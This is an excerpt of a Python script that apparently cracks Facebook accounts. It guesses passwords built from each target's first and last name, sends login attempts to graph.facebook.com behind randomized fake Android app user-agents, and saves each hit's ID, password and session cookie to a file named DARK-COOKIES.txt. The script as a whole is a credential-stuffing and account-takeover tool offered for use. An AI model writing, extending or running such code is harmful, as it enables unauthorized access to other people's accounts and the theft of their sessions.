...
def clear():
    os.system('clear')
    logo()
    print(' \033[1;32mFB LINK : https://www.facebook.com/thiago.wu69 ')
    print(' GITHUB  : Darkyyy101')
...
def m1(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            headers={
                    'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {modeld} Build/{qp1a}) '+'[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=3.5,width=1440,height=2730};FBLC/en_US;FBRV/0;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
...
def m2(ids,names,passlist):
    ...
    try:
        ...
        try:
            ...
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [DARK ~ M2] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
            ...
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telennor;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.%s;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;FBOP/5;FBCA/arm64-v7a:]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/ZONG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/GT-I9505;FBSV/5.0.1;FBOP/5;FBCA/arm64-v7a:]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telennor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/GT-I9505;FBSV/5.0.1;FBOP/5;FBCA/arm64-v7a:]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
            ...
            if 'session_key' in req:
                ...
                open('/sdcard/DARK-COOKIES.txt','a').write(ids+"|"+pas+" | "+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
